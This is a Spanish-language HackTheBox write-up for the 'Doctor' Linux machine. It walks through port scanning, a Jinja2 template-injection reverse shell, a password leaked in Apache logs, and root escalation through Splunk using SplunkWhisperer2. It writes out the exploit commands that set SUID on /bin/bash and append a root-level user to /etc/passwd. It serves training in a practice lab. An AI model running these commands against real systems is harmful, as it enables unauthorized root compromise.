---
title: HackTheBox - Doctor
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, SSTI, SplunkWhisperer2, 'Information Leakage']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Doctor/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Doctor Machine Logo
---

Máquina Linux de nivel **Easy** de HackTheBox.

Técnicas usadas: **SSTI, SplunkWhisperer2, Information Leakage**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **`Máquina Doctor`**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Doctor/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Doctor/02-versions.png)


> Añadimos el host **`doctors.htb`** en el archivo **`/etc/hosts`**
{: .prompt-info }


c. Inspeccionamos el sitio **`http://doctor.htb`** y registramos una cuenta.

![](/assets/images/HTB/Easy/Doctor/03-web.png)

> El uso de Flask lo hace propenso a un **`SSTI`**
{: .prompt-info }

![](/assets/images/HTB/Easy/Doctor/04-ssti.png)

* Al no obtener un **`49`** como respuesta, indagamos en el código fuente de la página web, aquí, nos encontramos con un comentario que menciona una ruta que sea encuentra en 'beta'

![](/assets/images/HTB/Easy/Doctor/05-leakeage.png)

* Visitamos esta nueva ruta e inspeccionamos su código fuente

![](/assets/images/HTB/Easy/Doctor/05-xml.png)

> El payload es interpretado por lo cual el ataque **`SSTI`** funciona.

d. Nos encontablaremos una reverse shell [STTI - RCE](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python)

![](/assets/images/HTB/Easy/Doctor/06-reverse.png)

* Ahora, vamos a la ruta **`/archive`** y la recargamos, para ejecutar el comando.

    ![](/assets/images/HTB/Easy/Doctor/07-reverse.png)


### Escalada de Privilegios 💹

a. Vemos los grupos a los que pertenecemos

```bash
web@doctor:~$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

> El grupo **`adm`** está autorizado para ver archivos logs.
{: .prompt-info }

* En el directorio **`/var/log/apache2`** existe un archivo **`backup`** el cual no es usual, por lo que lo leemos en busca de alguna contraseña

```bash
web@doctor:/var/log/apache2$ grep -i 'pass' backup
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

b. Obtenemos la contraseña **`Guitar123`** y tenemos otro usuario en el sistema **`shaun`**, intentamos convertirnos en este usuario

```bash
web@doctor:/var/log/apache2$ su shaun
Password: Guitar123
shaun@doctor:/var/log/apache2$
```

e. Al no encontrar una forma de escalar privilegios, visitamos el otro sitio web que estaba disponible **`https://<IP Doctor>:8089`**

![](/assets/images/HTB/Easy/Doctor/08-splunk.png)

* Visitamos cada uno de los módulos, estos requieren de auntenticación, por lo que intentamos loguearnos con las credenciales **`shaun:Guitar123`**
* El módulo que contiene información interesante es **`services`** y si visitamos la ruta **`/services/admin/users`** veremos que **`shaun`** es administrador del sistema.

f. Buscamos vulnerabilidades asociadas a **`splunk`** [SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2) y [Splunk - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/splunk-lpe-and-persistence)

* Una vez descargado el exploit podemos ejecutar comandos como **`root`**

```bash
> python PySplunkWhisperer2_remote.py --host [IP Doctor] --port 8089 --lhost [tun0 IP]  --username shaun --password Guitar123 --payload "chmod +s /bin/bash"
```

* Con esto la bash ya tiene el permiso **`SUID`** y podemos spawnear una como **`root`**

    ```bash
    shaun@doctor:/var/log/apache2$ ls -la /bin/bash
    -rwsr-sr-x 1 root root 1183448 Jun 18  2020 /bin/bash
    shaun@doctor:/var/log/apache2$ bash -p
    bash-5.0# whoami
    root
    ```

* También podemos agregar un usuario en el fichero **`/etc/passwd`**

```bash
> openssl passwd hola
$1$EHU.NHFo$95A.r07oTWCErDLLwtbV9.

> python PySplunkWhisperer2_remote.py --host [IP Doctor] --port 8089 --lhost [tun0 IP]  --username shaun --password Guitar123 "echo 'testing:\$1\$EHU.NHFo\$95A.r07oTWCErDLLwtbV9.:0:0::/home:/bin/bash' >> /etc/passwd"

<SNIP>
[ENTER]
```

* Si nos convertimos en **`testing`** tendremos una shell como **`root`**

    ```bash
    shaun@doctor:/var/log/apache2$ tail -n 1 /etc/passwd
    testing:$1$EHU.NHFo$95A.r07oTWCErDLLwtbV9.:0:0::/home:/bin/bash
    shaun@doctor:/var/log/apache2$ su testing
    Password: hola
    root@doctor:/var/log/apache2#
    ```